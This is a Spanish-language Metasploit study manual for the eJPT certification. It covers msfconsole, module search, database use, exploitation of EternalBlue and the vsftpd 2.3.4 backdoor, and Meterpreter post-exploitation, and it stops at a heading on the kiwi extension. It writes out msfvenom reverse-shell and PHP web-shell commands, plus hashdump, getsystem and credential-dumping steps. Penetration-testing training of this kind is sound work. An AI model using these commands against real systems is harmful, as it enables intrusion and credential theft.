@@ -1,0 +1,451 @@
+# 🛡️ GUÍA COMPLETA DE METASPLOIT FRAMEWORK: EXPLOTACIÓN, POST-EXPLOTACIÓN, PAYLOADS Y ARMAMENTIZACIÓN
+### *Manual Didáctico y Guía de Referencia Práctica – Certificación eJPT*
+
+---
+
+> **Estructura del Manual:** Organizado exactamente según las 5 fuentes oficiales de la libreta sobre Metasploit Framework. Cada sección corresponde a un módulo traducido al español, en texto narrativo continuo sin listas de viñetas fuera de tablas o bloques de código, con explicaciones conceptuales profundas, sintaxis de comandos, tablas de referencia rápida y procedimientos paso a paso para consulta inmediata en exámenes o auditorías de seguridad.
+
+---
+
+## 🚀 Matriz de Consulta Rápida (Cheat Sheet de Metasploit)
+
+| Acción / Comando | Sintaxis / Ubicación | Propósito Principal |
+| :--- | :--- | :--- |
+| **Iniciar Consola** | `msfconsole` | Arrancar la interfaz principal de línea de comandos del marco. |
+| **Inicializar BD** | `sudo msfdb init` | Crear e iniciar la base de datos PostgreSQL en Kali Linux. |
+| **Espacios de Trabajo** | `workspace -a NOMBRE` \| `workspace NOMBRE` | Crear o cambiar el espacio de trabajo activo para aislar datos. |
+| **Buscar Módulos** | `search type:exploit platform:windows cve:2017` | Buscar exploits por categoría, sistema operativo o código CVE. |
+| **Cargar Módulo** | `use exploit/windows/smb/ms17_010_eternalblue` | Entrar al contexto de un módulo específico. |
+| **Ver Opciones** | `show options` | Mostrar parámetros obligatorios y opcionales del módulo activo. |
+| **Asignar Opción Local** | `set RHOSTS 10.10.10.15` \| `set LHOST 10.10.14.2` | Establecer parámetros específicos para el módulo actual. |
+| **Asignar Opción Global** | `setg RHOSTS 10.10.10.15` \| `setg LHOST 10.10.14.2` | Establecer parámetros que persisten en todos los módulos. |
+| **Verificar Objetivo** | `check` | Probar si el objetivo es vulnerable sin lanzar la carga útil. |
+| **Lanzar Exploit** | `exploit` \| `run -j` | Ejecutar el ataque o lanzarlo como trabajo en segundo plano. |
+| **Escaneo en Base Datos** | `db_nmap -sV -sC 10.10.10.15` | Escanear con Nmap y guardar resultados automáticamente en la BD. |
+| **Consultar BD** | `hosts` \| `services` \| `creds` \| `vulns` | Ver equipos, servicios, credenciales o vulnerabilidades guardadas. |
+| **Listar Sesiones** | `sessions` \| `sessions -i 1` | Listar conexiones activas o interactuar con la sesión número 1. |
+| **Meterpreter: Info** | `sysinfo` \| `getuid` \| `getpid` \| `ps` | Obtener datos del sistema, usuario actual, PID y lista de procesos. |
+| **Meterpreter: Migrar** | `migrate PID` | Mover la sesión de Meterpreter a un proceso más estable o elevado. |
+| **Meterpreter: Elevar** | `getsystem` | Intentar elevar privilegios a NT AUTHORITY\SYSTEM en Windows. |
+| **Meterpreter: Hashes** | `hashdump` | Extraer hashes NTLM locales de la base de datos SAM del objetivo. |
+| **Meterpreter: Kiwi** | `load kiwi` $\rightarrow$ `creds_all` | Cargar extensión Mimikatz para extraer claves en texto plano. |
+| **Generar Payload EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe` | Crear ejecutable independiente de Windows sin etapas. |
+| **Generar Payload ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf` | Crear ejecutable independiente de Linux sin etapas. |
+| **Generar Web Shell PHP** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php` | Crear web shell en script PHP para subida de archivos. |
+| **Receptor Universal** | `use exploit/multi/handler` | Configurar el oyente para recibir conexiones salientes inversas. |
+
+---
+
+## 1. Metasploit: Los Fundamentos
+
+### 1.1 Introducción al Metasploit Framework
+El Metasploit Framework es la plataforma de explotación de código abierto más utilizada en la industria de las pruebas de penetración y la auditoría de seguridad. Creado originalmente por H.D. Moore en el año 2003 como una herramienta de red portátil en Perl y posteriormente reescrito en Ruby, el proyecto fue adquirido por la firma Rapid7 en 2009. A lo largo de dos décadas, Metasploit se ha transformado en un ecosistema robusto que alberga más de 2.600 exploits y supera los 6.100 módulos totales dedicados a diversas fases del pentesting.
+
+Para comprender la utilidad de Metasploit en un entorno profesional, resulta útil compararlo con un taller mecánico especializado. En lugar de obligar al auditor a buscar, compilar y adaptar scripts de ataque dispersos e inestables por Internet, el marco proporciona un entorno centralizado con herramientas estandarizadas. Metasploit cubre el ciclo de vida completo de un ataque, comenzando por la recopilación de información y escaneo de servicios, pasando por la identificación técnica de fallos, la entrega controlada de código de explotación, el mantenimiento de acceso mediante post-explotación y la consolidación de evidencias para la elaboración de informes ejecutivos.
+
+El marco se distribuye fundamentalmente en dos versiones comerciales y comunitarias. Metasploit Pro es la edición comercial desarrollada por Rapid7 que incluye una interfaz gráfica de usuario (GUI), flujos de trabajo automatizados para pruebas a gran escala y motores de generación de informes. Por su parte, Metasploit Framework es la versión de código abierto impulsada por la comunidad que se ejecuta íntegramente desde la línea de comandos. Esta última es la versión preinstalada en distribuciones como Kali Linux, Parrot OS o el entorno AttackBox de TryHackMe. Todos los conceptos, comandos y módulos aprendidos en la versión de consola son idénticos en la versión comercial, ya que Metasploit Pro simplemente añade una capa de automatización sobre el mismo motor subyacente.
+
+El marco se sostiene conceptualmente sobre tres pilares operativos. El primer pilar es Msfconsole, la interfaz de línea de comandos central desde la cual se gestiona todo el entorno. El segundo pilar son los Módulos, componentes independientes de código diseñados para ejecutar tareas específicas dentro de la red. El tercer pilar lo constituyen las Herramientas externas independientes, entre las que destaca `msfvenom` para la creación de cargas útiles personalizadas fuera de la consola interactiva, así como utillajes auxiliares para el desarrollo de exploits como `pattern_create` y `pattern_offset`.
+
+### 1.2 Conceptos Clave y Cadena de Explotación
+Para utilizar Metasploit con precisión técnica es indispensable dominar la diferencia entre los tres términos fundamentales de la cadena de ataque: vulnerabilidad, exploit y payload. 
+
+Una vulnerabilidad es una debilidad, fallo de diseño, error de programación o mala configuración presente en el sistema objetivo. La vulnerabilidad por sí sola no causa un daño activo, sino que crea la oportunidad técnica para alterar el comportamiento previsto del sistema. Un exploit es el fragmento de código especializado diseñado para aprovechar esa vulnerabilidad específica; representa el mecanismo de penetración que desencadena el fallo de forma controlada. Por último, la carga útil o payload es el código ejecutable que se entrega y ejecuta en el sistema objetivo una vez que el exploit ha logrado superar las defensas iniciales. El exploit abre la puerta de acceso y el payload define la acción que el atacante realizará en el interior, como abrir un shell interactivo, crear un usuario o ejecutar comandos.
+
+La biblioteca completa de Metasploit se organiza jerárquicamente en siete categorías de módulos:
+
+Los módulos de explotación (`exploits`) están diseñados para atacar vulnerabilidades específicas en servicios y sistemas operativos determinados. Se estructuran por sistema operativo y protocolo, constituyendo el núcleo del marco con más de 2.600 elementos.
+
+Los módulos auxiliares (`auxiliary`) abarcan todas las funciones que no implican la entrega directa de un payload de explotación. Incluyen escáneres de puertos, identificadores de versiones de servicio, herramientas de fuerza bruta contra formularios o servicios de red, fuzzers y rastreadores web.
+
+Los módulos de cargas útiles (`payloads`) contienen el código que se ejecutará en la víctima tras el éxito del exploit. Metasploit incluye cerca de 1.700 payloads adaptados a diferentes arquitecturas y sistemas operativos.
+
+Los módulos de post-explotación (`post`) se ejecutan sobre sesiones ya establecidas para automatizar tareas de recopilación de información, extracción de contraseñas, enumeración de dominios de Active Directory, capturas de pantalla o pivoteo hacia redes internas.
+
+Los módulos de codificación (`encoders`) transforman la representación binaria de una carga útil. Su función principal es eliminar caracteres problemáticos que podrían romper la ejecución del exploit (como bytes nulos `\x00`, retornos de carro o saltos de línea). Conviene aclarar que la codificación no representa una técnica efectiva de evasión frente a antivirus modernos, ya que los motores heurísticos detectan fácilmente los stubs de decodificación.
+
+Los módulos NOP (`nops`) generan secuencias de instrucciones que no realizan operaciones en la CPU (como el byte `0x90` en arquitecturas x86). Se utilizan como trineos o colchones de relleno en ataques de desbordamiento de búfer para garantizar que el puntero de instrucción aterrice de manera segura en el payload.
+
+Los módulos de evasión (`evasion`) están diseñados de forma específica para intentar eludir controles de seguridad activos en el endpoint, tales como Windows Defender o AppLocker, mediante técnicas de manipulación en memoria o ejecución de binarios del sistema.
+
+En el ámbito de las cargas útiles, Metasploit distingue dos arquitecturas de entrega: independientes o sin etapas (`singles` o `stageless`) y por etapas (`staged`). Las cargas útiles sin etapas son componentes autónomos que empaquetan todo el código ejecutable en un único archivo. Se identifican en la ruta de Metasploit por utilizar un guión bajo `_` entre el tipo de shell y el método de conexión (por ejemplo `windows/x64/shell_reverse_tcp`). Son más pesadas en tamaño pero ofrecen mayor fiabilidad al no depender de transferencias de red secundarias. Por el contrario, las cargas útiles por etapas dividen la ejecución en dos partes: un pequeño inyector inicial (`stager`) que establece la conexión básica y descarga posteriormente desde el atacante la carga útil pesada (`stage`). Se identifican mediante una barra diagonal `/` (por ejemplo `windows/x64/shell/reverse_tcp`).
+
+### 1.3 Navegación por Msfconsole
+La consola interactiva `msfconsole` se inicia desde la terminal del sistema operativo ejecutando el comando `msfconsole`. Tras la pantalla de carga, el indicador de la línea de comandos cambia a `msf6 >` (o la versión correspondiente), lo que señala que los comandos introducidos serán procesados por el motor de Metasploit. Desde la consola es posible ejecutar comandos nativos del sistema operativo subyacente como `ip a`, `whoami` o `pwd`, aunque con la limitación de que no se admite la redirección de flujo mediante operadores de tubería o archivos en la shell.
+
+La interfaz proporciona un completo sistema de asistencia mediante el comando `help`, el cual admite consultar comandos específicos para visualizar sus parámetros detallados. Dispone además de historial navegable con las flechas del teclado, consulta de comandos anteriores mediante `history` y autocompletado inteligente con la tecla Tabulador para comandos, rutas de módulos y opciones de configuración.
+
+La localización de herramientas dentro del marco se realiza mediante el comando `search`. Para filtrar eficientemente entre miles de módulos, se recomienda combinar palabras clave con modificadores de búsqueda específicos. Entre los filtros más utilizados destacan `type:` para seleccionar la categoría (exploit, auxiliary, post, payload), `platform:` para el sistema operativo objetivo (windows, linux, php), `cve:` para buscar por el año y código de la vulnerabilidad, y `name:` para filtrar por el nombre descriptivo. Es posible excluir resultados anteponiendo un signo menos al filtro, por ejemplo `search type:exploit -platform:windows`.
+
+Al realizar una búsqueda, cada exploit muestra una calificación en la columna de rango (`Rank`) que determina su fiabilidad operativa:
+
+La calificación **Excellent** garantiza que el exploit no provocará caídas en el servicio, siendo típico en inyecciones de código, inyecciones SQL o inclusiones de archivos. La calificación **Great** cuenta con autodetección de configuración en objetivos comunes. La calificación **Good** dispone de configuraciones predeterminadas para los casos más habituales pero carece de autoidentificación. La calificación **Normal** es fiable solo contra versiones muy específicas del software. Las calificaciones **Average** y **Low** presentan tasas de éxito reducidas o inestabilidad, mientras que **Manual** se reserva para denegaciones de servicio o módulos que exigen intervención técnica compleja.
+
+Para inspeccionar minuciosamente las características de un módulo antes de utilizarlo, se ejecuta el comando `info` seguido de la ruta del módulo o del número de índice asignado en la tabla de búsqueda. La salida del comando `info` detalla la plataforma soportada, los requerimientos de privilegios (campo `Privileged`), si el módulo admite comprobación no destructiva sin lanzar el payload (campo `Check supported`) y las referencias a boletines internacionales de seguridad como CVE o Exploit-DB.
+
+### 1.4 Configuración y Ejecución de Módulos
+Para operar con precisión dentro de Metasploit es necesario identificar en todo momento el contexto indicado por la línea de comandos. Cuando la consola muestra `msf6 >`, nos encontramos en el contexto global sin ningún módulo seleccionado. Al ejecutar el comando `use` seguido de la ruta de un módulo, el indicador cambia a `msf6 exploit(ruta/modulo) >`, señalando que los comandos de configuración se aplicarán a esa herramienta. Una vez establecida una sesión interactiva en la víctima, el indicador cambiará a `meterpreter >` o a la shell nativa del sistema operativo como `C:\Windows\system32>`.
+
+Al seleccionar un módulo con `use`, se carga una carga útil predeterminada. Para examinar la lista completa de parámetros configurables se utiliza el comando `show options`. La salida se divide en las opciones del módulo (como la dirección IP del objetivo), las opciones del payload (como la dirección IP y puerto del atacante) y la definición del objetivo específico (`Target`). Los parámetros marcados con un valor `Yes` en la columna `Required` son strictly obligatorios antes de poder lanzar el ataque.
+
+Los seis parámetros fundamentales que se configuran con mayor frecuencia en Metasploit son:
+
+`RHOSTS` ("Remote Hosts"): La dirección IP, rango CIDR o archivo de texto con las direcciones IP de los sistemas objetivo.
+
+`RPORT` ("Remote Port"): El puerto de red en el objetivo donde escucha el servicio vulnerable.
+
+`LHOST` ("Local Host"): La dirección IP de la máquina del atacante a la cual debe conectarse la carga útil inversa.
+
+`LPORT` ("Local Port"): El puerto en la máquina del atacante a la escucha para recibir la conexión entrante (por defecto 4444).
+
+`PAYLOAD`: La carga útil específica seleccionada para ser entregada durante la explotación.
+
+`SESSION`: El número de identificación de una sesión interactiva previa, utilizado al configurar módulos de post-explotación.
+
+La asignación de valores se realiza mediante el comando `set NOMBRE_PARAMETRO VALOR`. Si se utiliza `set`, la configuración será local y se perderá al cambiar de módulo. Para evitar reescribir repetidamente parámetros que no cambian a lo largo de una auditoría (como `LHOST` o `RHOSTS`), se utiliza el comando de asignación global `setg NOMBRE_PARAMETRO VALOR`. Para eliminar una variable local se utiliza `unset`, y para limpiar variables globales se ejecuta `unsetg`.
+
+Si se desea modificar la carga útil predeterminada por otra diferente, se consultan las opciones compatibles mediante `show payloads` y se aplica el cambio con `set PAYLOAD ruta/payload`. Antes de lanzar la explotación activa en entornos de producción, es recomendable ejecutar el comando `check` en aquellos módulos que lo soporten, con el fin de verificar si el sistema remoto es vulnerable sin arriesgar la estabilidad del servicio. Para iniciar la explotación se ejecuta el comando `exploit` o su alias `run`. Si se desea ejecutar el módulo y enviar la sesión resultante directamente a segundo plano sin tomar el control inmediato de la pantalla, se añade la bandera `-z` (`exploit -z`).
+
+### 1.5 Gestión de Sesiones
+Una sesión en Metasploit representa un canal de comunicación interactivo activo establecido entre la máquina atacante y el sistema comprometido. Las sesiones se clasifican según el tipo de payload que las originó: sesiones Meterpreter (agente avanzado con comandos especializados de memoria y sistema), sesiones de Shell tradicional (consola de comandos nativa `cmd.exe` o `/bin/bash`) y sesiones específicas de protocolo (como accesos interactivos a motores de bases de datos MSSQL, MySQL o recursos SMB).
+
+Cuando el auditor se encuentra dentro de una sesión interactiva activa y requiere regresar a la consola de Metasploit para ejecutar otros módulos sin perder el acceso conseguido, debe enviar la sesión a segundo plano mediante el comando `background` o la combinación de teclas `Ctrl + Z`.
+
+Para administrar las conexiones disponibles desde el contexto global de `msfconsole`, se utiliza el comando `sessions`. Al ejecutar `sessions` sin argumentos, se despliega una tabla con todas las sesiones activas, mostrando su número de ID, tipo de shell, usuario con el que se ejecuta la sesión, nombre de host y dirección IP de origen y destino. Para retomar el control de una sesión específica se ejecuta `sessions -i ID_SESION`. Si se requiere cerrar una sesión de forma definitiva se utiliza `sessions -k ID_SESION`, mientras que para finalizar la totalidad de las sesiones activas de forma simultánea se ejecuta el comando `sessions -K`.
+
+---
+
+## 2. Metasploit: Escaneo y Explotación
+
+### 2.1 Escaneo con Módulos de Metasploit y Nmap
+El escaneo de red e identificación de servicios dentro de Metasploit ofrece una ventaja operativa fundamental frente al uso de herramientas independientes: la integración directa con la base de datos interna. Al realizar el reconocimiento desde la consola de Metasploit, todos los puertos abiertos, servicios descubiertos y versiones de software quedan registrados automáticamente en el proyecto.
+
+Metasploit incluye módulos auxiliares de escaneo de puertos ubicados en la categoría `auxiliary/scanner/portscan/`. El módulo más utilizado es `auxiliary/scanner/portscan/tcp`, el cual realiza un escaneo completo de conexión TCP (`TCP Connect`). A diferencia de Nmap (que escanea por defecto los 1.000 puertos más frecuentes), el escáner de Metasploit analiza secuencialmente el rango definido en el parámetro `PORTS` (por defecto del 1 al 10.000). Se puede acelerar la velocidad del análisis ajustando el parámetro `THREADS` (número de hilos paralelos) y `CONCURRENCY` (número de puertos comprobados simultáneamente por host).
+
+Además de los escáneres genéricos, Metasploit cuenta con módulos de reconocimiento diseñados para protocolos específicos:
+
+El módulo `auxiliary/scanner/netbios/nbname` realiza peticiones sobre el servicio de nombres NetBIOS para extraer el nombre de host exacto, grupo de trabajo y dominio en entornos Windows.
+
+El módulo `auxiliary/scanner/http/http_version` analiza servidores web para identificar la tecnología y versión exacta del software HTTP.
+
+El módulo `auxiliary/scanner/smb/smb_login` permite realizar pruebas de fuerza bruta o comprobación de credenciales sobre el servicio SMB utilizando diccionarios de usuarios y contraseñas.
+
+Aunque es posible ejecutar el comando estándar `nmap` desde la consola de Metasploit, los datos resultantes solo se mostrarán en pantalla pero no se guardarán en el sistema de almacenamiento de la herramienta. Para garantizar que los hallazgos de Nmap se guarden automáticamente en la base de datos del marco, se debe utilizar el comando integrado `db_nmap` pasándole los mismos parámetros habituales (por ejemplo `db_nmap -sV -sC IP_OBJETIVO`).
+
+### 2.2 Gestión de la Base de Datos de Metasploit
+Metasploit utiliza un sistema de almacenamiento relacional basado en PostgreSQL para organizar la información recopilada durante una auditoría. En distribuciones como Kali Linux, la base de datos se inicializa en el sistema operativo mediante el comando `sudo msfdb init`. Una vez dentro de `msfconsole`, se verifica el estado de la conexión mediante el comando `db_status`, el cual debe responder con el mensaje `Connected to msf`.
+
+La organización de los datos dentro de la base de datos se gestiona mediante Espacios de Trabajo (`Workspaces`). Los espacios de trabajo permiten aislar por completo los descubrimientos de diferentes proyectos o redes sin mezclar objetivos. Al iniciar Metasploit, se trabaja en el espacio de trabajo denominado `default`. Para listar los espacios de trabajo existentes se ejecuta el comando `workspace`. Para crear un nuevo espacio de trabajo y cambiar inmediatamente a él se utiliza `workspace -a NOMBRE_PROYECTO`. Para alternar entre proyectos creados se escribe `workspace NOMBRE_PROYECTO`, y para eliminar un espacio de trabajo junto a todos sus registros almacenados se ejecuta `workspace -d NOMBRE_PROYECTO`.
+
+Una vez estructurados los datos en la base de datos, el auditor puede realizar consultas mediante comandos dedicados:
+
+El comando `hosts` lista todas las direcciones IP de las máquinas descubiertas en el espacio de trabajo actual.
+
+El comando `services` muestra la totalidad de los puertos abiertos y servicios identificados. Admite el filtro `-S` para buscar servicios específicos (por ejemplo `services -S smb`). Una función de gran utilidad es la opción `-R`, la cual puebla automáticamente el parámetro `RHOSTS` del módulo activo con las direcciones IP resultantes de la consulta (por ejemplo `services -S http -R`).
+
+El comando `creds` almacena y lista todas las credenciales válidas encontradas durante la fase de análisis (usuarios y contraseñas recuperados por módulos de fuerza bruta o captura de hashes).
+
+El comando `vulns` lista las vulnerabilidades confirmadas en los objetivos, incluyendo sus referencias CVE asociadas.
+
+Si se han realizado escaneos previos con herramientas externas como Nmap, Nessus, Qualys o Burp Suite y se han guardado los resultados en formato XML, es posible importar los datos directamente a la base de datos de Metasploit mediante el comando `db_import ruta/archivo.xml`. De igual forma, los datos acumulados en el proyecto pueden exportarse para la fase de informes con `db_export -f xml ruta/salida.xml`.
+
+### 2.3 Identificación de Vulnerabilidades (Vulnerability Scanning)
+El escaneo de vulnerabilidades en Metasploit consiste en vincular la información de versiones obtenida en el reconocimiento con módulos auxiliares de comprobación técnica. Esta fase busca identificar lo que en ciberseguridad se denomina "fruta al alcance de la mano" (*low-hanging fruit*): sistemas sin actualizar, configuraciones predeterminadas inseguras o vulnerabilidades conocidas de alta severidad.
+
+El procedimiento operativo para identificar vulnerabilidades se basa en utilizar la cadena de versión detectada como término de búsqueda dentro del marco. Por ejemplo, si el análisis de red detecta un puerto 445 abierto en un servidor Windows Server 2008, se busca el módulo de comprobación de la vulnerabilidad MS17-010 (EternalBlue) mediante `search type:auxiliary ms17_010`. Cargando el módulo `auxiliary/scanner/smb/smb_ms17_010`, asignando la IP con `set RHOSTS` y ejecutando `run`, el escáner verificará de forma no destructiva si el objetivo es vulnerable. Si la vulnerabilidad se confirma, el módulo registrará el hallazgo de forma automática en la tabla `vulns` de la base de datos.
+
+De forma similar, ante la presencia de un servicio FTP en el puerto 21, se utiliza el módulo `auxiliary/scanner/ftp/anonymous` para comprobar si el servidor permite el inicio de sesión anónimo sin credenciales. La clave en esta fase no es lanzar escáneres de forma indiscriminada, sino realizar comprobaciones dirigidas y justificadas en función de los servicios reales identificados en la base de datos.
+
+### 2.4 Explotación Práctica: EternalBlue vs. vsftpd 2.3.4 Backdoor
+Para ilustrar la versatilidad de Metasploit frente a diferentes entornos, se analizan dos escenarios de explotación representativos: la vulnerabilidad de desbordamiento de búfer EternalBlue en Windows y la puerta trasera implantada en vsftpd en Linux.
+
+En el primer escenario, se aborda la explotación de MS17-010 sobre el servicio SMB (puerto 445) en Windows Server 2008. Se selecciona el módulo `exploit/windows/smb/ms17_010_eternalblue`. Por defecto, Metasploit asigna la carga útil por etapas `windows/x64/meterpreter/reverse_tcp`. Se verifica que `LHOST` apunte a la IP de la máquina atacante y `RHOSTS` a la víctima. Al ejecutar `exploit`, el módulo aprovecha el fallo a nivel de kernel e inyecta la carga útil en memoria, devolviendo una sesión de Meterpreter con el máximo nivel de privilegios del sistema (`NT AUTHORITY\SYSTEM`). Desde la sesión se ejecuta el comando `hashdump` para extraer los hashes NTLM locales de la base de datos SAM y posteriormente se envía la sesión a segundo plano con `background`.
+
+En el segundo escenario, se examina la vulnerabilidad presente en el servicio FTP vsftpd versión 2.3.4 (puerto 21) en un servidor Linux. Esta vulnerabilidad histórica no se debe a un error accidental de programación, sino a un código malicioso (puerta trasera) introducido en los archivos fuente originales en el año 2011. La puerta trasera se activa cuando un cliente se conecta al servicio FTP e introduce un nombre de usuario que finaliza con una carita sonriente `:)`. Al detectarlo, el servidor abre una shell de comandos en el puerto TCP 6200 de la víctima.
+
+Para explotar esta vulnerabilidad se carga el módulo `exploit/unix/ftp/vsftpd_234_backdoor`. En este caso, la carga útil predeterminada no es Meterpreter, sino una shell interactiva simple (`cmd/unix/interact` o `cmd/unix/reverse_bash`), ya que la puerta trasera expone directamente una consola de comandos sin soporte para inyección de DLLs. Tras configurar `RHOSTS` y ejecutar `exploit`, se obtiene un acceso directo como usuario `root`.
+
+| Dimensión de Comparación | Exploit EternalBlue (MS17-010) | Exploit vsftpd 2.3.4 Backdoor |
+| :--- | :--- | :--- |
+| **Servicio Objetivo** | SMB (Puerto TCP 445) | FTP (Puerto TCP 21) |
+| **Sistema Operativo** | Windows 7 / Windows Server 2008 | Linux (Ubuntu / Debian) |
+| **Tipo de Vulnerabilidad** | Desbordamiento de búfer en driver SMBv1 | Puerta trasera intencional en código fuente |
+| **Rango del Exploit** | Average (Riesgo potencial de caída) | Excellent (Inofensivo para el servicio) |
+| **Payload Predeterminado** | `windows/x64/meterpreter/reverse_tcp` (Staged) | `cmd/unix/interact` (Single) |
+| **Tipo de Sesión** | Sesión interactiva Meterpreter | Shell de comandos nativa de Unix |
+| **Nivel de Privilegio** | `NT AUTHORITY\SYSTEM` | `root` |
+| **Soporte del Comando Check** | Sí (Permite verificación previa) | No (Requiere lanzamiento directo) |
+
+---
+
+## 3. Metasploit: Post-Explotación
+
+### 3.1 Arquitectura y Principios de Diseño de Meterpreter
+Meterpreter (abreviatura de *Meta-Interpreter*) es una carga útil de post-explotación avanzada construida sobre una arquitectura de Comando y Control (C2). A diferencia de una shell de comandos convencional que se limita a redirigir la entrada y salida estándar del sistema operativo objetivo (`cmd.exe` o `/bin/bash`), Meterpreter proporciona un entorno ejecutable en la víctima dotado de herramientas para la manipulación de memoria, captura de credenciales, escalada de privilegios y pivoteo de red.
+
+Meterpreter se diseña bajo tres principios fundamentales enfocados en el sigilo y la modularidad:
+
+El primer principio es la **Ejecución exclusiva en memoria RAM**. Meterpreter no escribe archivos ejecutables en el disco duro del sistema objetivo (no existe un archivo llamado `meterpreter.exe`). En su lugar, utiliza una técnica avanzada denominada *Inyección Reflectante de DLL* (*Reflective DLL Injection*), la cual carga la librería dinámica directamente en el espacio de memoria de un proceso legítimo en ejecución (por ejemplo en el spooler de impresión `spoolsv.exe` o en el proceso de explorador `explorer.exe`). Al no crear archivos en el disco, Meterpreter elude los análisis de firmas estáticas del software antivirus convencional.
+
+El segundo principio es la **Comunicación cifrada**. Todo el tráfico de control transmitido entre la sesión de Meterpreter y la máquina del atacante viaja protegido mediante cifrado SSL/TLS (en variantes HTTPS) o AES (en variantes TCP). Esto impide que los sistemas de detección de intrusiones en red (IDS/IPS) puedan inspeccionar los comandos o la exfiltración de datos salvo que realicen inspección SSL activa.
+
+El tercer principio es la **Extensibilidad modular bajo demanda**. El núcleo de Meterpreter se mantiene deliberadamente pequeño en tamaño. Cuando el auditor requiere funcionalidades adicionales (como volcar contraseñas de la memoria con Mimikatz), ejecuta el comando `load kiwi`. La extensión se transfiere a través de la red y se inyecta dinámicamente en la RAM del proceso sin tocar el almacenamiento secundario.
+
+### 3.2 Implementaciones de Meterpreter y Selección de Payloads
+Meterpreter no es un binario único universal, sino una familia de implementaciones adaptadas a diferentes entornos de ejecución y sistemas operativos:
+
+**Windows Meterpreter:** Es la versión original y más completa. Utiliza inyección de DLL reflectante en procesos de Windows y soporta el catálogo entero de comandos: migración de procesos, volcado de SAM, escalada con `getsystem`, captura de pantalla, registro de pulsaciones de teclado (*keylogging*) y extensiones como Kiwi.
+
+**Mettle:** Es la implementación multiplataforma escrita en C para sistemas Linux, macOS, BSD y dispositivos embebidos. Proporciona control total del sistema de archivos, procesos y red en entornos POSIX, aunque carece de los comandos específicos del registro de Windows.
+
+**Java Meterpreter:** Se ejecuta dentro de una Máquina Virtual Java (JVM). Es independiente del sistema operativo subyacente y se utiliza al explotar aplicaciones web basadas en Java como Apache Tomcat o Jenkins.
+
+**PHP Meterpreter:** Se ejecuta como código interpretado dentro del motor PHP de un servidor web. Es la opción estándar ante vulnerabilidades de subida de archivos o inclusión en aplicaciones web (WordPress, Joomla). Aunque no permite la migración de procesos al estar acotada al contexto del servidor web, ofrece acceso al sistema de archivos y ejecución de comandos.
+
+**Python Meterpreter:** Código interpretado para entornos donde el objetivo dispone del intérprete de Python instalado.
+
+Para seleccionar la carga útil adecuada se aplica un marco de decisión basado en tres factores: el sistema operativo objetivo (Windows vs Linux), los componentes ejecutables disponibles (binario nativo, intérprete PHP, JVM o Python) y el método de conexión deseado. En cuanto a la conexión, `reverse_tcp` es la opción estándar; `reverse_https` se utiliza para enmascarar el tráfico como navegación web legítima o eludir cortafuegos de salida restrictivos; y `bind_tcp` se reserva para situaciones donde la víctima no puede iniciar conexiones hacia el exterior.
+
+### 3.3 Comandos Esenciales de Meterpreter
+Una vez establecida una sesión de Meterpreter, el auditor dispone de un conjunto de comandos organizados por categorías operativas:
+
+#### Reconocimiento Situacional
+`sysinfo`: Muestra el nombre de host, versión del sistema operativo, arquitectura (x86/x64) y pertenencia a dominio.
+
+`getuid`: Muestra la cuenta de usuario específica bajo cuyos privilegios se ejecuta la sesión actual.
+
+`getpid`: Muestra el identificador de proceso (PID) en el cual está inyectado Meterpreter.
+
+`ps`: Lista la totalidad de procesos en ejecución en el sistema objetivo, indicando el PID, usuario propietario y arquitectura. Es clave para localizar procesos estables a los que migrar o identificar sesiones de usuario activas.
+
+`idletime`: Muestra el tiempo en segundos que el usuario remoto lleva sin interactuar con el teclado o ratón, lo que permite evaluar el riesgo de ser detectado al realizar acciones visuales.
+
+#### Operaciones en el Sistema de Archivos
+`pwd` / `cd` / `ls`: Comandos de navegación por la estructura de directorios.
+
+`cat`: Despliega el contenido de un archivo de texto en pantalla.
+
+`search -f *.txt -d C:\`: Busca archivos en el disco duro que coincidan con un patrón determinado.
+
+`download RUTA_REMOTA RUTA_LOCAL`: Descarga un archivo desde la víctima hacia la máquina atacante.
+
+`upload RUTA_LOCAL RUTA_REMOTA`: Sube un archivo o herramienta desde el atacante hacia la víctima.
+
+#### Red y Configuración
+`ifconfig` / `ipconfig`: Muestra las tarjetas de red e direcciones IP asignadas, fundamental para descubrir interfaces internas secundarias para pivoteo.
+
+`netstat`: Muestra las conexiones de red activas y puertos en escucha en el objetivo.
+
+#### Interacción con el Sistema Operativo
+`shell`: Abre una consola de comandos nativa del sistema operativo (`cmd.exe` o `/bin/bash`). Para regresar a Meterpreter se escribe `exit`.
+
+`execute -f comando.exe -i`: Ejecuta un programa directamente en el objetivo.
+
+`help`: Muestra la lista completa de comandos disponibles para la versión específica de Meterpreter en uso.
+
+### 3.4 Técnicas Avanzadas de Post-Explotación
+Una vez obtenido el acceso inicial, la post-explotación permite consolidar la posición mediante técnicas avanzadas:
+
+#### Migración de Procesos (`migrate`)
+La migración consiste en trasladar la ejecución de la sesión de Meterpreter desde su proceso actual hacia otro proceso diferente en la memoria del objetivo. Se ejecuta mediante `migrate PID_DESTINO`. Las razones para migrar incluyen garantizar la estabilidad (si el proceso explotado originalmente es cerrado por el usuario o es un servicio inestable), cambiar el contexto de usuario (heredando los permisos del nuevo proceso) o acceder a funcionalidades de interfaz (como migrar al proceso `explorer.exe` de un usuario para capturar su pantalla o pulsaciones de teclado). Se debe tener precaución al migrar desde un proceso con privilegios `SYSTEM` hacia un proceso de usuario convencional, ya que la sesión perderá sus permisos elevados.
+
+#### Escalada de Privilegios (`getsystem`)
+El comando `getsystem` intenta elevar automáticamente los permisos de la sesión actual hasta `NT AUTHORITY\SYSTEM` en entornos Windows mediante técnicas de suplantación de tuberías nombradas y duplicación de tokens. Funciona cuando la cuenta de usuario actual pertenece al grupo de Administradores locales.
+
+#### Cosecha de Credenciales (`hashdump`)
+El comando `hashdump` extrae los nombres de usuario y hashes NTLM de las cuentas locales almacenadas en la base de datos SAM de Windows. Requiere estrictamente privilegios de `SYSTEM`. Los hashes recuperados (en formato `Usuario:RID:LM_Hash:NTLM_Hash`) pueden utilizarse para descifrado offline con John the Ripper/Hashcat o para ataques de reutilización de hash (*Pass-the-Hash*).
+
+#### Carga de Extensiones (`load kiwi`)
